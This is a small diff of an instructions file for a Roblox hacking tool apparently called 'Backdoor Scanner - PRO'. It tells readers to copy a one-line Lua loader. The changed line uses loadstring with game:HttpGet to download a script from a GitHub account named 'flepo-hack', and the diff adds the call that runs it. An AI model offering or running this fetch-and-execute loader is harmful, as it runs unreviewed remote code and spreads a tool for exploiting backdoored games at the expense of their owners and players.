@@ -5,4 +5,4 @@ thanks for using Backdoor Scanner - PRO
 
 copy this
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/flepo-hack/Backdoor-Scanner---PRO/refs/heads/main/Script"))
+loadstring(game:HttpGet("https://raw.githubusercontent.com/flepo-hack/Backdoor-Scanner---PRO/refs/heads/main/Script"))()
